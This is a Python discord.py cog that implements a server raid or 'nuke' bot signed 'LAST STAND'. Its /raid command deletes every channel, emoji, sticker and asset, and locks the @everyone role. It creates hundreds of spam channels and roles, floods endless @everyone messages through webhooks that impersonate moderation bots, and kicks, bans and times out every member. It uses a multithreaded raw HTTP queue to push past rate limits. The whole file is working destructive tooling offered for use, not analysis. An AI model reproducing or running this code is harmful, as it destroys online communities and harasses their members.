"""
raid.py — LAST STAND | Raw destruction engine.
All delete/create/ban/kick/emoji/role operations use the 100-thread raw HTTP queue
(c-realV2.py port). Continuous channel spam stays async to keep heartbeat alive.

PHASES (all run concurrently from _launch):
  _rename_server  — rename + lock @everyone
  _wipe_assets    — remove icon, banner, description, stickers
  _wipe_emojis    — DELETE all custom emojis via queue
  _channel_loop   — queue delete all → queue create 100 → async spam → repeat
  _role_flood     — queue POST 200 raid roles
  _member_ops     — queue kick + ban + timeout + nick all members
"""

import asyncio
import datetime
import random
import string

import discord
import requests
from discord import app_commands
from discord.ext import commands

from utils.http_queue import HttpQueue, API_BASE
from utils.state import bot_state

RAID_TAG    = "LAST STAND"
RAID_LINK   = "https://discord.gg/s59zWvzK6c"
RAID_NAME   = "RAIDED BY JEAN(LORENZO) FROM LAST STAND"
RAIDER      = "JEAN(LORENZO)"
CREATE_PER_CYCLE = 480
WEBHOOKS_PER_CH  = 2
SPAM_BURST       = 3

_SPAM_SEM = asyncio.Semaphore(25)
_WH_SEM   = asyncio.Semaphore(15)

_MSGS = [
    f"@everyone 💀 **{RAID_NAME}** 💀 {RAID_LINK}",
    f"@everyone ☠️ {RAIDER} FROM LAST STAND WAS HERE ☠️ {RAID_LINK}",
    f"@everyone 🔥 YOUR SERVER HAS BEEN RAIDED BY {RAIDER} 🔥 {RAID_LINK}",
    f"@everyone ⚔️ {RAID_NAME} ⚔️ {RAID_LINK}",
    f"@everyone 💥 OBLITERATED BY {RAIDER} FROM LAST STAND 💥 {RAID_LINK}",
    f"@everyone 👑 {RAIDER} OWNS THIS SERVER | LAST STAND {RAID_LINK}",
    f"@here 💀 {RAID_NAME} {RAID_LINK}",
    f"@here ☠️ {RAIDER} RAID IN PROGRESS | LAST STAND {RAID_LINK}",
    f"@here 🎯 {RAID_NAME} {RAID_LINK}",
]

_WH_NAMES = [
    "Server Announcement", "Mod Alert", "AutoMod",
    "Carl-bot", "MEE6", "Wick",
    "LS Alpha", "LS Reaper", "LS Ghost",
    "JEAN(LORENZO)", "Last Stand",
]

_ROLE_NAMES = [
    "☠️ RAIDED BY JEAN(LORENZO)", "💀 LAST STAND", "🔥 RAIDED BY LS",
    "⚔️ LS OWNS YOU", "💥 OBLITERATED", "👑 LS WAS HERE",
    "🚨 RAIDED BY LAST STAND", "⚠️ SERVER COMPROMISED",
    "🔴 LS RAID", "💣 JEAN(LORENZO) FROM LS",
]

_NICKS = ["RAIDED", "LS Was Here", "GG no re", "PWNED", "JEAN(LORENZO)", RAID_TAG]

_CH_OPTS = [
    "raided-by-ls-{i}",
    "last-stand-{i}",
    "ls-owned-{i}",
    "ls-raid-{i}",
    "jean-lorenzo-{i}",
]

_ROLE_COLORS = [
    0xFF0000, 0x8B0000, 0xFF6600, 0xFF4500,
    0x800080, 0x4B0082, 0xFF1493, 0xDC143C,
]


def _rand(n: int = 4) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _ch_name(i: int = 0) -> str:
    return random.choice(_CH_OPTS).format(i=i)


def _msg() -> str:
    return random.choice(_MSGS)


class Raid(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    # ─────────────────────────────────────────────────────────────────────────
    # /testperms
    # ─────────────────────────────────────────────────────────────────────────
    @app_commands.command(name="testperms", description="Check bot permissions in this server.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def testperms(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer(ephemeral=True)
        guild = interaction.guild
        me    = guild.me
        p     = me.guild_permissions

        lines = [
            f"**Bot permission check — {guild.name}**",
            f"Administrator    : {'✅' if p.administrator else '❌'}",
            f"Manage Guild     : {'✅' if p.manage_guild else '❌'}",
            f"Manage Channels  : {'✅' if p.manage_channels else '❌'}",
            f"Manage Roles     : {'✅' if p.manage_roles else '❌'}",
            f"Manage Webhooks  : {'✅' if p.manage_webhooks else '❌'}",
            f"Ban Members      : {'✅' if p.ban_members else '❌'}",
            f"Kick Members     : {'✅' if p.kick_members else '❌'}",
            f"Moderate Members : {'✅' if p.moderate_members else '❌'}",
            f"",
            f"Bot top role     : `{me.top_role.name}` (pos {me.top_role.position})",
        ]
        await interaction.followup.send("\n".join(lines), ephemeral=True)

    # ─────────────────────────────────────────────────────────────────────────
    # /testcreate
    # ─────────────────────────────────────────────────────────────────────────
    @app_commands.command(name="testcreate", description="Try to create one test channel and report exact result.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def testcreate(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer(ephemeral=True)
        guild = interaction.guild
        try:
            ch = await asyncio.wait_for(guild.create_text_channel("lsc-test-channel"), timeout=15.0)
            await interaction.followup.send(
                f"✅ **Channel creation WORKS.** Created: <#{ch.id}>\nRun `/raid` now.",
                ephemeral=True,
            )
            try:
                await ch.delete()
            except Exception:
                pass
        except asyncio.TimeoutError:
            await interaction.followup.send(
                "❌ **TIMEOUT** — create_text_channel hung 15s.\n"
                "• Guild at 500-channel cap\n"
                "• Discord rate-limiting this guild (wait 10–15 min)\n"
                "• Redeploy on Railway to reset connection",
                ephemeral=True,
            )
        except discord.Forbidden as e:
            await interaction.followup.send(f"❌ **403 FORBIDDEN** — `{e}`", ephemeral=True)
        except discord.HTTPException as e:
            await interaction.followup.send(f"❌ **HTTP {e.status}** — `{e.text}`", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ `{type(e).__name__}: {e}`", ephemeral=True)

    # ── shared launch ──────────────────────────────────────────────────────────
    async def _launch(self, guild: discord.Guild, invoker_id: int, reply) -> None:
        if bot_state.active_simulation:
            await reply(f"⚠️ **{bot_state.active_simulation}** is running — use `.stop` or `/stop` first.")
            return

        if not guild.me.guild_permissions.manage_channels and not guild.me.guild_permissions.administrator:
            await reply("❌ Missing **Manage Channels** — run `/testperms`.")
            return

        bot_state.reset()
        bot_state.active_simulation = "raid"

        try:
            await reply(
                f"☠️ **{RAID_TAG} — RAID LAUNCHED** ☠️\n"
                f"┣ ENGINE: 100-thread raw HTTP queue (c-realV2 system)\n"
                f"┣ DELETE all channels + roles + emojis simultaneously\n"
                f"┣ REBUILD {CREATE_PER_CYCLE} flood channels + 200 raid roles\n"
                f"┣ BAN + KICK + TIMEOUT all members at once\n"
                f"┣ SPAM every channel (direct + webhooks) — loops forever\n"
                f"┗ `/stop` or `.stop` to halt."
            )
        except Exception:
            pass

        bot_state.add_task(asyncio.create_task(self._rename_server(guild)))
        bot_state.add_task(asyncio.create_task(self._wipe_assets(guild)))
        bot_state.add_task(asyncio.create_task(self._wipe_emojis(guild)))
        bot_state.add_task(asyncio.create_task(self._channel_loop(guild)))
        bot_state.add_task(asyncio.create_task(self._role_flood(guild)))
        bot_state.add_task(asyncio.create_task(self._member_ops(guild, invoker_id)))

    # ── /raid ──────────────────────────────────────────────────────────────────
    @app_commands.command(name="raid", description=f"☠️ Full destruction — {RAID_TAG}. Runs until /stop.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def raid(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer()
        await self._launch(interaction.guild, interaction.user.id, interaction.followup.send)

    # ── .raid ──────────────────────────────────────────────────────────────────
    @commands.command(name="raid")
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def raid_prefix(self, ctx: commands.Context) -> None:
        await ctx.send("There is no going back now son 😔")

    # ─────────────────────────────────────────────────────────────────────────
    # RENAME + LOCK
    # ─────────────────────────────────────────────────────────────────────────
    async def _rename_server(self, guild: discord.Guild) -> None:
        try:
            await guild.edit(name=RAID_NAME)
            print("[raid] server renamed OK", flush=True)
        except Exception as e:
            print(f"[raid] rename FAILED: {e}", flush=True)
        try:
            await guild.default_role.edit(permissions=discord.Permissions.none())
            print("[raid] @everyone locked OK", flush=True)
        except Exception as e:
            print(f"[raid] lock @everyone FAILED: {e}", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # WIPE SERVER ASSETS
    # ─────────────────────────────────────────────────────────────────────────
    async def _wipe_assets(self, guild: discord.Guild) -> None:
        try:
            await guild.edit(
                description=f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
                icon=None,
                banner=None,
            )
            print("[raid] server assets wiped OK", flush=True)
        except Exception as e:
            print(f"[raid] asset wipe FAILED: {e}", flush=True)

        for sticker in list(guild.stickers):
            try:
                await sticker.delete()
            except Exception:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # EMOJI WIPE — queue DELETE for every custom emoji simultaneously
    # ─────────────────────────────────────────────────────────────────────────
    async def _wipe_emojis(self, guild: discord.Guild) -> None:
        q = HttpQueue.get()
        emojis = list(guild.emojis)
        if not emojis:
            return
        for e in emojis:
            q.put(requests.delete, f"{API_BASE}/guilds/{guild.id}/emojis/{e.id}")
        await q.join()
        print(f"[raid] wiped {len(emojis)} emojis", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # CONTINUOUS NUKE LOOP
    #   1. Queue DELETE all channels → join
    #   2. Queue POST 100 new channels → join
    #   3. Async spam every channel (direct + webhooks)
    #   4. Short pause, then repeat
    # ─────────────────────────────────────────────────────────────────────────
    async def _channel_loop(self, guild: discord.Guild) -> None:
        se    = bot_state.stop_event
        q     = HttpQueue.get()
        cycle = 0

        try:
            if not se.is_set():
                cycle = 1

                # ── DELETE all channels via 100-thread queue ───────────────
                existing = list(guild.channels)
                print(f"[nuke] cycle {cycle} — queuing {len(existing)} deletes", flush=True)
                for ch in existing:
                    q.put(requests.delete, f"{API_BASE}/channels/{ch.id}")
                await q.join()

                if not se.is_set():
                    # let gateway deliver CHANNEL_DELETE events
                    await asyncio.sleep(1.5)

                    # ── CREATE 100 flood channels via 100-thread queue ─────
                    print(f"[nuke] cycle {cycle} — queuing {CREATE_PER_CYCLE} creates", flush=True)
                    for i in range(CREATE_PER_CYCLE):
                        if se.is_set():
                            break
                        q.put(
                            requests.post,
                            f"{API_BASE}/guilds/{guild.id}/channels",
                            {
                                "name": _ch_name(i),
                                "type": 0,
                                "topic": f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
                            },
                        )

                    if not se.is_set():
                        await q.join()

                    # let gateway deliver CHANNEL_CREATE events
                    await asyncio.sleep(2.0)

                    # ── start spam tasks on every fresh channel ────────────
                    for ch in list(guild.text_channels):
                        if se.is_set():
                            break
                        bot_state.add_task(asyncio.create_task(self._spam_channel(ch)))
                        for _ in range(WEBHOOKS_PER_CH):
                            bot_state.add_task(asyncio.create_task(self._add_webhook(ch)))

                    print(f"[nuke] cycle {cycle} — spam launched on {len(guild.text_channels)} channels", flush=True)

        except asyncio.CancelledError:
            q.clear()
            print("[nuke] channel_loop cancelled", flush=True)
        except Exception as e:
            print(f"[nuke] channel_loop CRASH: {type(e).__name__}: {e}", flush=True)
        finally:
            print("[nuke] channel_loop exiting", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # ADD WEBHOOK
    # ─────────────────────────────────────────────────────────────────────────
    async def _add_webhook(self, channel: discord.TextChannel) -> None:
        se = bot_state.stop_event
        if se.is_set():
            return
        async with _WH_SEM:
            try:
                wh = await asyncio.wait_for(
                    channel.create_webhook(name=random.choice(_WH_NAMES)),
                    timeout=10.0,
                )
                bot_state.add_task(asyncio.create_task(self._spam_webhook(wh)))
            except asyncio.TimeoutError:
                pass
            except (discord.NotFound, discord.Forbidden):
                pass
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(float(getattr(e, "retry_after", 2.0)))
            except Exception:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # DIRECT CHANNEL SPAM
    # ─────────────────────────────────────────────────────────────────────────
    async def _spam_channel(self, channel: discord.TextChannel) -> None:
        se       = bot_state.stop_event
        mentions = discord.AllowedMentions(everyone=True, roles=True)

        while not se.is_set():
            async with _SPAM_SEM:
                if se.is_set():
                    return
                try:
                    results = await asyncio.gather(
                        *[channel.send(_msg(), allowed_mentions=mentions) for _ in range(SPAM_BURST)],
                        return_exceptions=True,
                    )
                    for r in results:
                        if isinstance(r, (discord.NotFound, discord.Forbidden)):
                            return
                        if isinstance(r, discord.HTTPException) and r.status == 429:
                            await asyncio.sleep(float(getattr(r, "retry_after", 1.0)))
                except (discord.NotFound, discord.Forbidden):
                    return
                except Exception:
                    return
            await asyncio.sleep(0.1)

    # ─────────────────────────────────────────────────────────────────────────
    # WEBHOOK SPAM
    # ─────────────────────────────────────────────────────────────────────────
    async def _spam_webhook(self, wh: discord.Webhook) -> None:
        se       = bot_state.stop_event
        mentions = discord.AllowedMentions(everyone=True, roles=True)

        while not se.is_set():
            async with _WH_SEM:
                if se.is_set():
                    return
                try:
                    results = await asyncio.gather(
                        *[wh.send(_msg(), username=random.choice(_WH_NAMES), allowed_mentions=mentions)
                          for _ in range(SPAM_BURST)],
                        return_exceptions=True,
                    )
                    for r in results:
                        if isinstance(r, (discord.NotFound, discord.Forbidden)):
                            return
                        if isinstance(r, discord.HTTPException) and r.status == 429:
                            await asyncio.sleep(float(getattr(r, "retry_after", 1.0)))
                except (discord.NotFound, discord.Forbidden):
                    return
                except Exception:
                    return
            await asyncio.sleep(0.1)

    # ─────────────────────────────────────────────────────────────────────────
    # ROLE FLOOD — queue POST 200 raid roles simultaneously
    # ─────────────────────────────────────────────────────────────────────────
    async def _role_flood(self, guild: discord.Guild) -> None:
        q  = HttpQueue.get()
        se = bot_state.stop_event

        for i in range(200):
            if se.is_set():
                break
            q.put(
                requests.post,
                f"{API_BASE}/guilds/{guild.id}/roles",
                {
                    "name": f"{random.choice(_ROLE_NAMES)} {i}",
                    "color": random.choice(_ROLE_COLORS),
                    "permissions": "0",
                },
            )

        if not se.is_set():
            await q.join()

        print("[role] role flood done", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # MEMBER OPS — queue kick + ban + timeout + nick for all members at once
    # ─────────────────────────────────────────────────────────────────────────
    async def _member_ops(self, guild: discord.Guild, invoker_id: int) -> None:
        se = bot_state.stop_event
        print("[raid] member_ops: chunking...", flush=True)

        try:
            await asyncio.wait_for(guild.chunk(cache=True), timeout=10.0)
        except Exception as e:
            print(f"[raid] chunk error: {e}", flush=True)

        if se.is_set():
            return

        me = guild.me
        targets = [
            m for m in guild.members
            if not m.bot
            and m.id != invoker_id
            and m.id != me.id
            and m.top_role < me.top_role
        ]
        print(f"[raid] queuing ops on {len(targets)} members", flush=True)

        q = HttpQueue.get()
        timeout_until = (
            datetime.datetime.utcnow() + datetime.timedelta(days=28)
        ).strftime("%Y-%m-%dT%H:%M:%S.000Z")

        for m in targets:
            if se.is_set():
                break
            # kick
            q.put(requests.delete, f"{API_BASE}/guilds/{guild.id}/members/{m.id}")
            # ban
            q.put(
                requests.put,
                f"{API_BASE}/guilds/{guild.id}/bans/{m.id}",
                {"delete_message_days": 0},
            )
            # timeout + nick in one PATCH
            q.put(
                requests.patch,
                f"{API_BASE}/guilds/{guild.id}/members/{m.id}",
                {
                    "communication_disabled_until": timeout_until,
                    "nick": random.choice(_NICKS),
                },
            )

        if not se.is_set():
            await q.join()

        print("[raid] member_ops done", flush=True)

    # ── error handlers ─────────────────────────────────────────────────────────
    @raid.error
    async def raid_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        msg = "❌ You need **Administrator** permission." if isinstance(error, app_commands.MissingPermissions) else f"❌ {error}"
        try:
            if interaction.response.is_done():
                await interaction.followup.send(msg, ephemeral=True)
            else:
                await interaction.response.send_message(msg, ephemeral=True)
        except Exception:
            pass

    @testperms.error
    @testcreate.error
    async def test_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        try:
            await interaction.response.send_message(f"❌ {error}", ephemeral=True)
        except Exception:
            pass


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Raid(bot))
